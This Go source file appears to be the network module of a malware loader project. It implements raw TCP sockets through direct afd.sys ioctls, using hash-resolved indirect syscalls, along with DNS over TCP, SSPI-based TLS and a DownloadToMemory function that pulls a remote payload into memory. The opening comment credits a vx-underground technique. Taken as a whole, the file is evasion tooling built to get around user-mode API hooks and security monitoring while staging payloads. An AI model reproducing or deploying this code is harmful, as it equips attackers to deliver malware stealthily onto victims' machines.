// --------------------------------------------------------------------------------------------
// basically just rewrote @vxunderground afd.sys socket code in golang, thank you smelly
// --------------------------------------------------------------------------------------------

package net

import (
	"encoding/binary"
	"errors"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	wc "github.com/carved4/go-wincall"
	"github.com/carved4/meltloader/pkg/pe"
)

func htons(v uint16) uint16 { return (v << 8) | (v >> 8) }
func htonl(v uint32) uint32 {
	return ((v & 0x000000FF) << 24) | ((v & 0x0000FF00) << 8) |
		((v & 0x00FF0000) >> 8) | ((v & 0xFF000000) >> 24)
}

var (
	ntCreateFile          = wc.GetSyscall(wc.GetHash("NtCreateFile"))
	ntDeviceIoControlFile = wc.GetSyscall(wc.GetHash("NtDeviceIoControlFile"))
	ntWaitForSingleObject = wc.GetSyscall(wc.GetHash("NtWaitForSingleObject"))
)

var sspiTable *pe.SecurityFunctionTableW

func initSSPI() error {
	if sspiTable != nil {
		return nil
	}
	wc.LoadLibraryLdr("sspicli.dll")
	base := wc.GetModuleBase(wc.GetHash("sspicli.dll"))
	if base == 0 {
		return errors.New("failed to load sspicli.dll")
	}
	initSecIfaceW := wc.GetFunctionAddress(base, wc.GetHash("InitSecurityInterfaceW"))
	if initSecIfaceW == 0 {
		return errors.New("InitSecurityInterfaceW not found")
	}
	tablePtr, _, _ := wc.CallG0(initSecIfaceW)
	if tablePtr == 0 {
		return errors.New("InitSecurityInterfaceW returned NULL")
	}
	sspiTable = (*pe.SecurityFunctionTableW)(unsafe.Pointer(tablePtr))
	return nil
}

var (
	certGetCertificateChain          uintptr
	certVerifyCertificateChainPolicy uintptr
	certFreeCertificateChain         uintptr
	certFreeCertificateContext       uintptr
	crypt32Resolved                  bool
)

func initCrypt32() error {
	if crypt32Resolved {
		return nil
	}
	wc.LoadLibraryLdr("crypt32.dll")
	base := wc.GetModuleBase(wc.GetHash("crypt32.dll"))
	if base == 0 {
		return errors.New("failed to load crypt32.dll")
	}
	certGetCertificateChain = wc.GetFunctionAddress(base, wc.GetHash("CertGetCertificateChain"))
	certVerifyCertificateChainPolicy = wc.GetFunctionAddress(base, wc.GetHash("CertVerifyCertificateChainPolicy"))
	certFreeCertificateChain = wc.GetFunctionAddress(base, wc.GetHash("CertFreeCertificateChain"))
	certFreeCertificateContext = wc.GetFunctionAddress(base, wc.GetHash("CertFreeCertificateContext"))
	if certGetCertificateChain == 0 || certVerifyCertificateChainPolicy == 0 ||
		certFreeCertificateChain == 0 || certFreeCertificateContext == 0 {
		return errors.New("failed to resolve crypt32 functions")
	}
	crypt32Resolved = true
	return nil
}

var (
	sockCreated int
	sockClosed  int
)

type afdSocket struct {
	handle uintptr
}

func afdIoctl(sock uintptr, ioctl uint32, inBuf unsafe.Pointer, inLen uint32, outBuf unsafe.Pointer, outLen uint32) (uintptr, error) {
	iosb := new(pe.IO_STATUS_BLOCK)
	const STATUS_PENDING = 0x00000103
	ret, _ := wc.IndirectSyscall(ntDeviceIoControlFile.SSN, ntDeviceIoControlFile.Address,
		sock, 0, 0, 0,
		uintptr(unsafe.Pointer(iosb)),
		uintptr(ioctl),
		uintptr(inBuf), uintptr(inLen),
		uintptr(outBuf), uintptr(outLen))
	if ret == STATUS_PENDING {
		wc.IndirectSyscall(ntWaitForSingleObject.SSN, ntWaitForSingleObject.Address, sock, 0, 0)
		ret = uintptr(iosb.Status)
	}
	runtime.KeepAlive(iosb)
	if int32(ret) < 0 {
		return 0, fmt.Errorf("NtDeviceIoControlFile failed: 0x%x", ret)
	}
	return iosb.Information, nil
}

func afdCreateTCPSocket() (*afdSocket, error) {
	eaName := [16]byte{'A', 'f', 'd', 'O', 'p', 'e', 'n', 'P', 'a', 'c', 'k', 'e', 't', 'X', 'X', 0}
	ea := new(pe.AFD_OPEN_PACKET_EXTENDED_ATTRIBUTES)
	ea.ExtendedAttributeNameLength = 15
	ea.ExtendedAttributeValueLength = 30
	ea.AddressFamily = pe.AF_INET
	ea.SocketType = pe.SOCK_STREAM
	ea.Protocol = pe.IPPROTO_TCP
	ea.ExtendedAttributeName = eaName
	for i := range ea.Unknown1 {
		ea.Unknown1[i] = 0xff
	}

	devicePath, _ := wc.UTF16ptr(`\Device\Afd\Endpoint`)
	ustr := new(pe.UNICODE_STRING)
	ustr.Buffer = devicePath
	pathLen := 0
	for p := devicePath; *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(p)) + uintptr(pathLen*2))) != 0; pathLen++ {
	}
	ustr.Length = uint16(pathLen * 2)
	ustr.MaximumLength = ustr.Length + 2

	oa := new(pe.OBJECT_ATTRIBUTES)
	oa.Length = uint32(unsafe.Sizeof(*oa))
	oa.ObjectName = ustr
	oa.Attributes = pe.OBJ_CASE_INSENSITIVE

	handle := new(uintptr)
	iosb := new(pe.IO_STATUS_BLOCK)
	accessMask := uintptr(0x80000000 | 0x40000000 | 0x00100000)

	ret, _ := wc.IndirectSyscall(ntCreateFile.SSN, ntCreateFile.Address,
		uintptr(unsafe.Pointer(handle)),
		accessMask,
		uintptr(unsafe.Pointer(oa)),
		uintptr(unsafe.Pointer(iosb)),
		0, 0,
		uintptr(0x00000001|0x00000002),
		uintptr(pe.FILE_OPEN_IF),
		uintptr(pe.FILE_SYNCHRONOUS_IO_NONALERT),
		uintptr(unsafe.Pointer(ea)),
		uintptr(unsafe.Sizeof(*ea)))
	if int32(ret) < 0 {
		return nil, fmt.Errorf("NtCreateFile AFD failed: 0x%x", ret)
	}
	runtime.KeepAlive(oa)
	runtime.KeepAlive(ustr)
	runtime.KeepAlive(ea)
	runtime.KeepAlive(devicePath)
	sockCreated++
	return &afdSocket{handle: *handle}, nil
}

func (s *afdSocket) Close() {
	if s.handle != 0 {
		r, _, _ := wc.Call("kernel32.dll", "CloseHandle", s.handle)
		if r == 0 {
			fmt.Printf("CloseHandle(socket 0x%x) failed\n", s.handle)
		}
		sockClosed++
		s.handle = 0
	}
}

func (s *afdSocket) Bind() error {
	bind := new(pe.AFD_BIND_SOCKET)
	bind.Address.Sin_family = pe.AF_INET
	out := make([]byte, 16)
	_, err := afdIoctl(s.handle, pe.IOCTL_AFD_BIND, unsafe.Pointer(bind), uint32(unsafe.Sizeof(*bind)), unsafe.Pointer(&out[0]), uint32(len(out)))
	runtime.KeepAlive(bind)
	runtime.KeepAlive(out)
	return err
}

func (s *afdSocket) Connect(ip uint32, port uint16) error {
	req := new(pe.AFD_CONNECT_REQUEST_IPV4)
	req.Address.Sin_family = pe.AF_INET
	req.Address.Sin_addr.S_addr = ip
	req.Address.Sin_port = htons(port)
	_, err := afdIoctl(s.handle, pe.IOCTL_AFD_CONNECT, unsafe.Pointer(req), uint32(unsafe.Sizeof(*req)), nil, 0)
	runtime.KeepAlive(req)
	return err
}

func (s *afdSocket) Send(data []byte) error {
	offset := 0
	for offset < len(data) {
		ioBuf := new(pe.AFD_IO_BUFFER)
		ioBuf.Length = uint32(len(data) - offset)
		ioBuf.Buffer = uintptr(unsafe.Pointer(&data[offset]))
		req := new(pe.AFD_TRANSFER_REQUEST)
		req.Buffer = ioBuf
		req.BufferCount = 1
		out := make([]byte, 16)
		info, err := afdIoctl(s.handle, pe.IOCTL_AFD_SEND, unsafe.Pointer(req), uint32(unsafe.Sizeof(*req)), unsafe.Pointer(&out[0]), uint32(len(out)))
		if err != nil {
			return err
		}
		sent := int(info)
		if sent == 0 {
			return errors.New("afd send: 0 bytes sent")
		}
		offset += sent
		runtime.KeepAlive(ioBuf)
		runtime.KeepAlive(req)
		runtime.KeepAlive(out)
	}
	runtime.KeepAlive(data)
	return nil
}

func (s *afdSocket) Recv(buf []byte) (int, error) {
	ioBuf := new(pe.AFD_IO_BUFFER)
	ioBuf.Length = uint32(len(buf))
	ioBuf.Buffer = uintptr(unsafe.Pointer(&buf[0]))
	req := new(pe.AFD_TRANSFER_REQUEST)
	req.Buffer = ioBuf
	req.BufferCount = 1
	req.TdiFlags = 32
	out := make([]byte, 16)
	info, err := afdIoctl(s.handle, pe.IOCTL_AFD_RECV, unsafe.Pointer(req), uint32(unsafe.Sizeof(*req)), unsafe.Pointer(&out[0]), uint32(len(out)))
	runtime.KeepAlive(ioBuf)
	runtime.KeepAlive(req)
	runtime.KeepAlive(out)
	if err != nil {
		return 0, err
	}
	return int(info), nil
}

func dnsResolve(hostname string) (uint32, error) {
	var qname []byte
	for _, label := range strings.Split(hostname, ".") {
		if len(label) == 0 || len(label) > 63 {
			return 0, fmt.Errorf("invalid DNS label: %q", label)
		}
		qname = append(qname, byte(len(label)))
		qname = append(qname, []byte(label)...)
	}
	qname = append(qname, 0)

	txID := uint16(0xBEEF)
	var msg []byte
	msg = binary.BigEndian.AppendUint16(msg, txID)
	msg = binary.BigEndian.AppendUint16(msg, 0x0100)
	msg = binary.BigEndian.AppendUint16(msg, 1)
	msg = binary.BigEndian.AppendUint16(msg, 0)
	msg = binary.BigEndian.AppendUint16(msg, 0)
	msg = binary.BigEndian.AppendUint16(msg, 0)
	msg = append(msg, qname...)
	msg = binary.BigEndian.AppendUint16(msg, 1)
	msg = binary.BigEndian.AppendUint16(msg, 1)

	sock, err := afdCreateTCPSocket()
	if err != nil {
		return 0, fmt.Errorf("dns: socket: %w", err)
	}
	defer sock.Close()

	if err := sock.Bind(); err != nil {
		return 0, fmt.Errorf("dns: bind: %w", err)
	}
	if err := sock.Connect(htonl(0x01010101), 53); err != nil {
		return 0, fmt.Errorf("dns: connect: %w", err)
	}

	var lenBuf [2]byte
	binary.BigEndian.PutUint16(lenBuf[:], uint16(len(msg)))
	if err := sock.Send(lenBuf[:]); err != nil {
		return 0, fmt.Errorf("dns: send len: %w", err)
	}
	if err := sock.Send(msg); err != nil {
		return 0, fmt.Errorf("dns: send msg: %w", err)
	}

	var respLenBuf [2]byte
	n, err := sock.Recv(respLenBuf[:])
	if err != nil || n != 2 {
		return 0, fmt.Errorf("dns: recv len: %w", err)
	}
	respLen := int(binary.BigEndian.Uint16(respLenBuf[:]))
	if respLen < 12 || respLen > 4096 {
		return 0, fmt.Errorf("dns: bad response length %d", respLen)
	}

	resp := make([]byte, respLen)
	total := 0
	for total < respLen {
		n, err := sock.Recv(resp[total:])
		if err != nil {
			return 0, fmt.Errorf("dns: recv: %w", err)
		}
		if n == 0 {
			return 0, errors.New("dns: connection closed")
		}
		total += n
	}

	return dnsExtractARecord(resp, txID)
}

func dnsExtractARecord(buf []byte, txID uint16) (uint32, error) {
	if len(buf) < 12 {
		return 0, errors.New("dns: response too short")
	}
	id := binary.BigEndian.Uint16(buf[0:2])
	if id != txID {
		return 0, errors.New("dns: txid mismatch")
	}
	flags := binary.BigEndian.Uint16(buf[2:4])
	if flags&0x8000 == 0 {
		return 0, errors.New("dns: not a response")
	}
	if flags&0x000F != 0 {
		return 0, fmt.Errorf("dns: rcode %d", flags&0x000F)
	}
	qdCount := binary.BigEndian.Uint16(buf[4:6])
	anCount := binary.BigEndian.Uint16(buf[6:8])
	off := 12
	for i := uint16(0); i < qdCount; i++ {
		off = dnsSkipName(buf, off)
		off += 4 // QTYPE + QCLASS
	}
	for i := uint16(0); i < anCount; i++ {
		off = dnsSkipName(buf, off)
		if off+10 > len(buf) {
			return 0, errors.New("dns: truncated answer")
		}
		aType := binary.BigEndian.Uint16(buf[off : off+2])
		aClass := binary.BigEndian.Uint16(buf[off+2 : off+4])
		rdLen := binary.BigEndian.Uint16(buf[off+8 : off+10])
		off += 10
		if aType == 1 && aClass == 1 && rdLen == 4 {
			return binary.LittleEndian.Uint32(buf[off : off+4]), nil
		}
		off += int(rdLen)
	}
	return 0, errors.New("dns: no A record found")
}

func dnsSkipName(buf []byte, off int) int {
	for off < len(buf) {
		b := buf[off]
		if b == 0 {
			return off + 1
		}
		if b&0xC0 == 0xC0 {
			return off + 2
		}
		off += 1 + int(b)
	}
	return off
}

func tlsAcquireCredentials(client *pe.TLSClient) error {
	cred := new(pe.SCHANNEL_CRED)
	cred.DwVersion = pe.SCHANNEL_CRED_VERSION

	providerName, _ := wc.UTF16ptr("Microsoft Unified Security Protocol Provider")
	expiry := new(pe.SECURITY_INTEGER)

	ret, _, _ := wc.CallG0(sspiTable.AcquireCredentialsHandleW,
		0,
		uintptr(unsafe.Pointer(providerName)),
		uintptr(2), // SECPKG_CRED_OUTBOUND
		0,
		uintptr(unsafe.Pointer(cred)),
		0, 0,
		uintptr(unsafe.Pointer(&client.CredentialHandle)),
		uintptr(unsafe.Pointer(expiry)))
	runtime.KeepAlive(cred)
	runtime.KeepAlive(providerName)
	runtime.KeepAlive(expiry)
	if int32(ret) != 0 {
		return fmt.Errorf("AcquireCredentialsHandle failed: 0x%x", ret)
	}
	client.CredentialInitialized = true
	return nil
}

func tlsFreeClient(client *pe.TLSClient) {
	if client.ContextInitialized {
		wc.CallG0(sspiTable.DeleteSecurityContext, uintptr(unsafe.Pointer(&client.ContextHandle)))
		client.ContextInitialized = false
	}
	if client.CredentialInitialized {
		wc.CallG0(sspiTable.FreeCredentialsHandle, uintptr(unsafe.Pointer(&client.CredentialHandle)))
		client.CredentialInitialized = false
	}
}

func tlsHandshake(client *pe.TLSClient, sock *afdSocket, hostW *uint16) error {
	const bufSize = 16384
	contextReq := uintptr(pe.ISC_REQ_SEQUENCE_DETECT | pe.ISC_REQ_REPLAY_DETECT |
		pe.ISC_REQ_CONFIDENTIALITY | pe.ISC_REQ_EXTENDED_ERROR |
		pe.ISC_REQ_ALLOCATE_MEMORY | pe.ISC_REQ_STREAM)

	data := make([]byte, bufSize)
	dataLen := uint32(0)

	for {

		inBufs := new([2]pe.SecBuffer)
		inBufs[0] = pe.SecBuffer{CbBuffer: dataLen, BufferType: pe.SECBUFFER_TOKEN}
		if dataLen > 0 {
			inBufs[0].PvBuffer = uintptr(unsafe.Pointer(&data[0]))
		}
		inBufs[1] = pe.SecBuffer{BufferType: pe.SECBUFFER_EMPTY}
		inDesc := &pe.SecBufferDesc{UlVersion: pe.SECBUFFER_VERSION, CBuffers: 2, PBuffers: &inBufs[0]}

		outBuf := new(pe.SecBuffer)
		outBuf.BufferType = pe.SECBUFFER_TOKEN
		outDesc := &pe.SecBufferDesc{UlVersion: pe.SECBUFFER_VERSION, CBuffers: 1, PBuffers: outBuf}

		attrs := new(uint32)
		expiry := new(pe.SECURITY_INTEGER)
		var status uintptr

		if !client.ContextInitialized {
			status, _, _ = wc.CallG0(sspiTable.InitializeSecurityContextW,
				uintptr(unsafe.Pointer(&client.CredentialHandle)),
				0,
				uintptr(unsafe.Pointer(hostW)),
				contextReq, 0,
				uintptr(pe.SECURITY_NATIVE_DREP),
				0, 0,
				uintptr(unsafe.Pointer(&client.ContextHandle)),
				uintptr(unsafe.Pointer(outDesc)),
				uintptr(unsafe.Pointer(attrs)),
				uintptr(unsafe.Pointer(expiry)))
			client.ContextInitialized = true
		} else {
			status, _, _ = wc.CallG0(sspiTable.InitializeSecurityContextW,
				uintptr(unsafe.Pointer(&client.CredentialHandle)),
				uintptr(unsafe.Pointer(&client.ContextHandle)),
				uintptr(unsafe.Pointer(hostW)),
				contextReq, 0,
				uintptr(pe.SECURITY_NATIVE_DREP),
				uintptr(unsafe.Pointer(inDesc)),
				0, 0,
				uintptr(unsafe.Pointer(outDesc)),
				uintptr(unsafe.Pointer(attrs)),
				uintptr(unsafe.Pointer(expiry)))
		}

		if outBuf.PvBuffer != 0 && outBuf.CbBuffer > 0 {
			outSlice := unsafe.Slice((*byte)(unsafe.Pointer(outBuf.PvBuffer)), outBuf.CbBuffer)
			if err := sock.Send(outSlice); err != nil {
				wc.CallG0(sspiTable.FreeContextBuffer, outBuf.PvBuffer)
				return fmt.Errorf("tls handshake send: %w", err)
			}
			wc.CallG0(sspiTable.FreeContextBuffer, outBuf.PvBuffer)
		}

		ss := int32(status)
		if ss == pe.SEC_E_OK {
			break
		}

		if status == uintptr(uint32(pe.SEC_I_CONTINUE_NEEDED)) || ss == pe.SEC_E_INCOMPLETE_MESSAGE {
			if inBufs[1].BufferType == pe.SECBUFFER_EXTRA {
				extra := inBufs[1].CbBuffer
				copy(data[:extra], data[dataLen-extra:dataLen])
				dataLen = extra
			} else {
				dataLen = 0
			}
			if int(dataLen) >= bufSize {
				return errors.New("tls handshake: buffer overflow")
			}
			n, err := sock.Recv(data[dataLen:])
			if err != nil {
				return fmt.Errorf("tls handshake recv: %w", err)
			}
			if n == 0 {
				return errors.New("tls handshake: connection closed")
			}
			dataLen += uint32(n)
		} else {
			return fmt.Errorf("tls handshake failed: 0x%x", status)
		}

		runtime.KeepAlive(inBufs)
		runtime.KeepAlive(inDesc)
		runtime.KeepAlive(outBuf)
		runtime.KeepAlive(outDesc)
		runtime.KeepAlive(expiry)
	}

	ret, _, _ := wc.CallG0(sspiTable.QueryContextAttributesW,
		uintptr(unsafe.Pointer(&client.ContextHandle)),
		uintptr(pe.SECPKG_ATTR_STREAM_SIZES),
		uintptr(unsafe.Pointer(&client.Sizes)))
	if int32(ret) != 0 {
		return fmt.Errorf("QueryContextAttributes StreamSizes failed: 0x%x", ret)
	}

	if err := tlsVerifyCert(client, hostW); err != nil {
		return err
	}

	return nil
}

func tlsVerifyCert(client *pe.TLSClient, hostW *uint16) error {
	serverCert := new(uintptr)
	ret, _, _ := wc.CallG0(sspiTable.QueryContextAttributesW,
		uintptr(unsafe.Pointer(&client.ContextHandle)),
		uintptr(pe.SECPKG_ATTR_REMOTE_CERT_CONTEXT),
		uintptr(unsafe.Pointer(serverCert)))
	if int32(ret) != 0 || *serverCert == 0 {
		return fmt.Errorf("failed to get server cert: 0x%x", ret)
	}
	defer wc.CallG0(certFreeCertificateContext, *serverCert)

	hCertStore := *(*uintptr)(unsafe.Pointer(*serverCert + 32))

	chainPara := new(pe.CERT_CHAIN_PARA)
	chainPara.CbSize = uint32(unsafe.Sizeof(*chainPara))

	chainCtx := new(uintptr)
	ok, _, _ := wc.CallG0(certGetCertificateChain,
		0, *serverCert, 0, hCertStore,
		uintptr(unsafe.Pointer(chainPara)),
		0, 0,
		uintptr(unsafe.Pointer(chainCtx)))
	if ok == 0 || *chainCtx == 0 {
		return errors.New("CertGetCertificateChain failed")
	}
	defer wc.CallG0(certFreeCertificateChain, *chainCtx)

	extra := new(pe.SSL_EXTRA_CERT_CHAIN_POLICY_PARA)
	extra.CbSize = uint32(unsafe.Sizeof(*extra))
	extra.DwAuthType = pe.AUTHTYPE_SERVER
	extra.PwszServerName = hostW

	policy := new(pe.CERT_CHAIN_POLICY_PARA)
	policy.CbSize = uint32(unsafe.Sizeof(*policy))
	policy.PvExtraPolicyPara = uintptr(unsafe.Pointer(extra))

	policyStatus := new(pe.CERT_CHAIN_POLICY_STATUS)
	policyStatus.CbSize = uint32(unsafe.Sizeof(*policyStatus))

	ok, _, _ = wc.CallG0(certVerifyCertificateChainPolicy,
		uintptr(4), *chainCtx,
		uintptr(unsafe.Pointer(policy)),
		uintptr(unsafe.Pointer(policyStatus)))
	if ok == 0 {
		return errors.New("CertVerifyCertificateChainPolicy call failed")
	}
	if policyStatus.DwError != 0 {
		return fmt.Errorf("cert policy error: 0x%x", policyStatus.DwError)
	}

	runtime.KeepAlive(chainPara)
	runtime.KeepAlive(extra)
	runtime.KeepAlive(policy)
	runtime.KeepAlive(policyStatus)
	return nil
}

func tlsSend(client *pe.TLSClient, sock *afdSocket, plaintext []byte) error {
	offset := 0
	for offset < len(plaintext) {
		maxFrag := int(client.Sizes.CbMaximumMessage)
		fragLen := len(plaintext) - offset
		if fragLen > maxFrag {
			fragLen = maxFrag
		}
		totalBuf := int(client.Sizes.CbHeader) + fragLen + int(client.Sizes.CbTrailer)
		buf := make([]byte, totalBuf)
		copy(buf[client.Sizes.CbHeader:], plaintext[offset:offset+fragLen])

		secBufs := new([4]pe.SecBuffer)
		secBufs[0] = pe.SecBuffer{CbBuffer: client.Sizes.CbHeader, BufferType: pe.SECBUFFER_STREAM_HEADER, PvBuffer: uintptr(unsafe.Pointer(&buf[0]))}
		secBufs[1] = pe.SecBuffer{CbBuffer: uint32(fragLen), BufferType: pe.SECBUFFER_DATA, PvBuffer: uintptr(unsafe.Pointer(&buf[client.Sizes.CbHeader]))}
		secBufs[2] = pe.SecBuffer{CbBuffer: client.Sizes.CbTrailer, BufferType: pe.SECBUFFER_STREAM_TRAILER, PvBuffer: uintptr(unsafe.Pointer(&buf[int(client.Sizes.CbHeader)+fragLen]))}
		secBufs[3] = pe.SecBuffer{BufferType: pe.SECBUFFER_EMPTY}
		desc := &pe.SecBufferDesc{UlVersion: pe.SECBUFFER_VERSION, CBuffers: 4, PBuffers: &secBufs[0]}

		ret, _, _ := wc.CallG0(sspiTable.EncryptMessage,
			uintptr(unsafe.Pointer(&client.ContextHandle)),
			0,
			uintptr(unsafe.Pointer(desc)),
			0)
		if int32(ret) != 0 {
			return fmt.Errorf("EncryptMessage failed: 0x%x", ret)
		}

		sendLen := int(secBufs[0].CbBuffer + secBufs[1].CbBuffer + secBufs[2].CbBuffer)
		if err := sock.Send(buf[:sendLen]); err != nil {
			return err
		}
		offset += fragLen
		runtime.KeepAlive(secBufs)
		runtime.KeepAlive(desc)
		runtime.KeepAlive(buf)
	}
	return nil
}

func tlsRecv(client *pe.TLSClient, sock *afdSocket) ([]byte, error) {
	var networkBuf []byte
	var response []byte
	recvBuf := make([]byte, 8192)

	headersFound := false
	contentLenKnown := false
	var totalExpected int

	for {
		if headersFound && contentLenKnown && len(response) >= totalExpected {
			break
		}

		n, err := sock.Recv(recvBuf)
		if err != nil {
			return response, err
		}
		if n == 0 {
			break
		}
		networkBuf = append(networkBuf, recvBuf[:n]...)

		for len(networkBuf) > 0 {

			secBufs := new([4]pe.SecBuffer)
			secBufs[0] = pe.SecBuffer{CbBuffer: uint32(len(networkBuf)), BufferType: pe.SECBUFFER_DATA, PvBuffer: uintptr(unsafe.Pointer(&networkBuf[0]))}
			secBufs[1] = pe.SecBuffer{BufferType: pe.SECBUFFER_EMPTY}
			secBufs[2] = pe.SecBuffer{BufferType: pe.SECBUFFER_EMPTY}
			secBufs[3] = pe.SecBuffer{BufferType: pe.SECBUFFER_EMPTY}
			desc := &pe.SecBufferDesc{UlVersion: pe.SECBUFFER_VERSION, CBuffers: 4, PBuffers: &secBufs[0]}

			ret, _, _ := wc.CallG0(sspiTable.DecryptMessage,
				uintptr(unsafe.Pointer(&client.ContextHandle)),
				uintptr(unsafe.Pointer(desc)),
				0, 0)
			ss := int32(ret)

			if ss == pe.SEC_E_INCOMPLETE_MESSAGE {
				break
			}
			if ret == uintptr(uint32(pe.SEC_I_CONTEXT_EXPIRED)) {
				return response, nil
			}
			if ss != pe.SEC_E_OK && ret != uintptr(uint32(pe.SEC_I_RENEGOTIATE)) {
				return response, fmt.Errorf("DecryptMessage failed: 0x%x", ret)
			}

			for i := 0; i < 4; i++ {
				if secBufs[i].BufferType == pe.SECBUFFER_DATA && secBufs[i].CbBuffer > 0 {
					decrypted := unsafe.Slice((*byte)(unsafe.Pointer(secBufs[i].PvBuffer)), secBufs[i].CbBuffer)
					response = append(response, decrypted...)
				}
			}

			if !headersFound {
				if idx := findHeaderEnd(response); idx >= 0 {
					headersFound = true
					cl := parseContentLength(response[:idx])
					if cl >= 0 {
						contentLenKnown = true
						totalExpected = idx + 4 + cl
					}
				}
			}

			if ret == uintptr(uint32(pe.SEC_I_RENEGOTIATE)) {
				return response, errors.New("tls renegotiation not supported")
			}
			var extraBuf []byte
			for i := 0; i < 4; i++ {
				if secBufs[i].BufferType == pe.SECBUFFER_EXTRA && secBufs[i].CbBuffer > 0 {
					extraBuf = make([]byte, secBufs[i].CbBuffer)
					copy(extraBuf, unsafe.Slice((*byte)(unsafe.Pointer(secBufs[i].PvBuffer)), secBufs[i].CbBuffer))
					break
				}
			}
			if len(extraBuf) > 0 {
				networkBuf = extraBuf
			} else {
				networkBuf = nil
			}

			runtime.KeepAlive(secBufs)
			runtime.KeepAlive(desc)
		}
	}
	return response, nil
}

func findHeaderEnd(data []byte) int {
	for i := 0; i+3 < len(data); i++ {
		if data[i] == '\r' && data[i+1] == '\n' && data[i+2] == '\r' && data[i+3] == '\n' {
			return i
		}
	}
	return -1
}

func parseContentLength(header []byte) int {
	lines := strings.Split(string(header), "\r\n")
	for _, line := range lines {
		lower := strings.ToLower(line)
		if strings.HasPrefix(lower, "content-length:") {
			val := strings.TrimSpace(line[len("content-length:"):])
			n := 0
			for _, c := range val {
				if c < '0' || c > '9' {
					return -1
				}
				n = n*10 + int(c-'0')
			}
			return n
		}
	}
	return -1
}

func parseHTTPStatusCode(header []byte) int {
	s := string(header)
	if len(s) < 12 {
		return -1
	}
	spIdx := strings.IndexByte(s, ' ')
	if spIdx < 0 || spIdx+4 > len(s) {
		return -1
	}
	code := 0
	for i := spIdx + 1; i < spIdx+4; i++ {
		c := s[i]
		if c < '0' || c > '9' {
			return -1
		}
		code = code*10 + int(c-'0')
	}
	return code
}

func parseLocationHeader(header []byte) string {
	lines := strings.Split(string(header), "\r\n")
	for _, line := range lines {
		lower := strings.ToLower(line)
		if strings.HasPrefix(lower, "location:") {
			return strings.TrimSpace(line[len("location:"):])
		}
	}
	return ""
}

func parseURL(url string) (host, path string, err error) {
	if strings.HasPrefix(url, "https://") {
		remaining := url[8:]
		if idx := strings.IndexByte(remaining, '/'); idx == -1 {
			host = remaining
			path = "/"
		} else {
			host = remaining[:idx]
			path = remaining[idx:]
		}
		return host, path, nil
	}
	if strings.HasPrefix(url, "http://") {
		return "", "", fmt.Errorf("http:// not supported, only https://")
	}
	return "", "", fmt.Errorf("invalid URL scheme: %s", url)
}

// hardcoded UA for now because lazy sorry had a hard time getting format accepted by evil windows kernel
func buildHTTPGetRequest(host, path string) []byte {
	return []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nAccept: */*\r\nConnection: close\r\n\r\n", path, host))
}

func httpsGet(host, path string) ([]byte, error) {
	ip, err := dnsResolve(host)
	if err != nil {
		return nil, fmt.Errorf("dns resolve %q: %w", host, err)
	}
	sock, err := afdCreateTCPSocket()
	if err != nil {
		return nil, fmt.Errorf("socket: %w", err)
	}
	defer sock.Close()

	if err := sock.Bind(); err != nil {
		return nil, fmt.Errorf("bind: %w", err)
	}
	if err := sock.Connect(ip, 443); err != nil {
		return nil, fmt.Errorf("connect: %w", err)
	}

	var tlsClient pe.TLSClient
	defer tlsFreeClient(&tlsClient)

	if err := tlsAcquireCredentials(&tlsClient); err != nil {
		return nil, err
	}

	hostW, _ := wc.UTF16ptr(host)
	if err := tlsHandshake(&tlsClient, sock, hostW); err != nil {
		return nil, err
	}

	httpReq := buildHTTPGetRequest(host, path)
	if err := tlsSend(&tlsClient, sock, httpReq); err != nil {
		return nil, fmt.Errorf("tls send: %w", err)
	}

	rawResp, err := tlsRecv(&tlsClient, sock)
	runtime.KeepAlive(hostW)
	runtime.KeepAlive(httpReq)
	if err != nil && len(rawResp) == 0 {
		return nil, fmt.Errorf("tls recv: %w", err)
	}
	return rawResp, nil
}

func DownloadToMemory(url string) ([]byte, error) {
	if err := initSSPI(); err != nil {
		return nil, fmt.Errorf("sspi init: %w", err)
	}
	if err := initCrypt32(); err != nil {
		return nil, fmt.Errorf("crypt32 init: %w", err)
	}

	const maxRedirects = 10
	currentURL := url

	for attempt := 0; attempt <= maxRedirects; attempt++ {
		host, path, err := parseURL(currentURL)
		if err != nil {
			return nil, err
		}
		rawResp, err := httpsGet(host, path)
		if err != nil {
			fmt.Printf("httpsGet failed: %v\n", err)
			return nil, err
		}

		headerEnd := findHeaderEnd(rawResp)
		if headerEnd < 0 {
			if len(rawResp) == 0 {
				return nil, errors.New("no data received")
			}
			return rawResp, nil
		}

		headerBytes := rawResp[:headerEnd]
		statusCode := parseHTTPStatusCode(headerBytes)

		if statusCode >= 301 && statusCode <= 308 {
			location := parseLocationHeader(headerBytes)
			if location == "" {
				return nil, fmt.Errorf("HTTP %d redirect with no Location header", statusCode)
			}
			if strings.HasPrefix(location, "/") {
				location = "https://" + host + location
			}
			currentURL = location
			continue
		}

		if statusCode < 200 || statusCode >= 300 {
			return nil, fmt.Errorf("HTTP %d", statusCode)
		}

		body := rawResp[headerEnd+4:]
		if len(body) == 0 {
			return nil, errors.New("no body in HTTP response")
		}
		return body, nil
	}

	return nil, errors.New("too many redirects")
}
